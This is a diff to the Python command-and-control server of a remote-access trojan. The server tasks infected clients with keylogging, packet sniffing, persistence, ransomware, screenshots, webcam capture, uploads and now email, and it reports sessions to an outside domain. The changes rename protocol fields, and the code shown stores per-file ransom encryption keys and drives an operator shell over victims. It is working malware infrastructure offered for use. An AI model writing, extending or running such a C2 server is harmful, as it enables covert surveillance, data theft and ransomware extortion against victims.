@@ -94,7 +94,7 @@ colorama.init()
 class Server(threading.Thread):
 
     global threads
-    database = {'domain': 'https://snapchat.sex/', 'pages' : {'query'     : 'query.php','session'   : 'session.php','ransom'    : 'ransom.php'},'session_key': None,'tasks': ['keylogger','packetsniffer','persistence','ransom','screenshot','webcam','upload']}
+    database = {'domain': 'https://snapchat.sex/', 'pages' : {'query'     : 'query.php','session'   : 'session.php','ransom'    : 'ransom.php'},'session_key': None,'tasks': ['keylogger','packetsniffer','persistence','ransom','screenshot','webcam','upload','email']}
     
     def __init__(self, port, **kwargs):
         super(Server, self).__init__()
@@ -324,7 +324,7 @@ class Server(threading.Thread):
             self._return()
         try:
             task_id = self.new_task_id(command, client_id)
-            task    = {'id': task_id, 'client_id': client.info['id'], 'session_id': client.session, 'task': command}
+            task    = {'task': task_id, 'client': client.info['id'], 'session': client.session, 'command': command}
             data    = self.encrypt(json.dumps(task), client.name) + '\n'
             client.connection.sendall(data)
         except Exception as e:
@@ -560,7 +560,7 @@ class Server(threading.Thread):
             else:
                 self.send_client("webcam %s" % args, client.name)
                 task    = self.recv_client(client.name)
-                result  = task.get('data')
+                result  = task.get('result')
             return result
         except Exception as e:
             self._error("webcam stream failed with error: {}".format(str(e)))
@@ -585,7 +585,7 @@ class Server(threading.Thread):
                 if buff and len(str(buff)) and bytes('0' * 64) not in buff:
                     data = self._decrypt_aes(buff, self._deobfuscate(client.session_key))
                     task = json.loads(data)
-                    save = self.query_database("INSERT INTO ransom (session_id, file_path, aes_key) VALUES ({})".format("'{}', ".format(i) for i in [task['session_id'], task['data']['file_path'], task['data']['aes_key']]), display=False)
+                    save = self.query_database("INSERT INTO ransom (session_id, file_path, aes_key) VALUES ({})".format("'{}', ".format(i) for i in [task['session'], task['result']['file_path'], task['result']['aes_key']]), display=False)
                 else:
                     break
         else:
@@ -638,18 +638,18 @@ class Server(threading.Thread):
     def save_task_results(self, task=None):
         try:
             if task:
-                cmd, _, __  = bytes(task.get('task')).partition(' ')
+                cmd, _, __  = bytes(task.get('command')).partition(' ')
                 if cmd in self.database['tasks']:
-                    query   = self.query_database("INSERT INTO tasks (id, client_id, session_id, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['id']), str(task['client_id']), str(task['session_id']), str(task['task']), str(task['data'])))), display=False)
+                    query   = self.query_database("INSERT INTO tasks (task, client, session, command, result) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['task']), str(task['client']), str(task['session']), str(task['command']), str(task['result'])))), display=False)
             else:
                 if self.current_client:
                     self.send_client('show results', self.current_client.name)
                     output  = self.recv_client(self.current_client.name)
-                    results = json.loads(output.get('data'))
+                    results = json.loads(output.get('result'))
                     for task in results:
-                        cmd, _, __  = bytes(task.get('task')).partition(' ')
+                        cmd, _, __  = bytes(task.get('command')).partition(' ')
                         if cmd in self.database['tasks']:
-                            query   = self.query_database("INSERT INTO tasks (id, client_id, session_id, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['id']), str(task['client_id']), str(task['session_id']), str(task['task']), str(task['data'])))), display=False)
+                            query   = self.query_database("INSERT INTO tasks (task, client, session, command, result) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['task']), str(task['client']), str(task['session']), str(task['command']), str(task['result'])))), display=False)
         except Exception as e:
             self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
         self._return()
@@ -797,7 +797,7 @@ class ClientHandler(threading.Thread):
 
     def _session(self):
         try:
-            query       = threads['server'].query_database("INSERT INTO sessions ({}) VALUES ({})".format(', '.join(['client_id','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info['id'], self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
+            query       = threads['server'].query_database("INSERT INTO sessions ({}) VALUES ({})".format(', '.join(['client','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info['id'], self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
             session_id  = requests.post(Server.database['domain'] + Server.database['pages']['session'], data={'id': self.info['id']}).content
             print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
             ciphertext  = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(session_id, threads['server']._deobfuscate(self.session_key))
@@ -838,9 +838,9 @@ class ClientHandler(threading.Thread):
                 task = self.prompt if self.prompt else threads['server'].recv_client(self.name)
                 self.shell.wait()
                 if type(task) is dict:
-                    if 'prompt' in task.get('task'):
+                    if 'prompt' in task.get('command'):
                         self.prompt     = task
-                        command         = self._prompt(bytes(self.prompt.get('data')).format(self.name))
+                        command         = self._prompt(bytes(self.prompt.get('result')).format(self.name))
                         cmd, _, action  = bytes(command).partition(' ')
                         if cmd in threads['server'].commands and cmd != 'help':
                             result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
@@ -852,16 +852,16 @@ class ClientHandler(threading.Thread):
                             continue
                         else:
                             threads['server'].send_client(command, self.name)
-                    elif 'help' in task.get('task'):
+                    elif 'help' in task.get('command'):
                         self.shell.clear()
-                        threads['server'].show_usage_help(data=task.get('data'))
+                        threads['server'].show_usage_help(data=task.get('result'))
                         self.shell.set()
-                    elif 'standby' in task.get('task'):
-                        print(task.get('data'))
+                    elif 'standby' in task.get('command'):
+                        print(task.get('result'))
                         break
                     else:
-                        if task.get('data'):
-                            threads['server']._print(task['data'])
+                        if task.get('result'):
+                            threads['server']._print(task['result'])
                             threads['server'].save_task_results(task)
                 self.prompt = None
             except Exception as e:
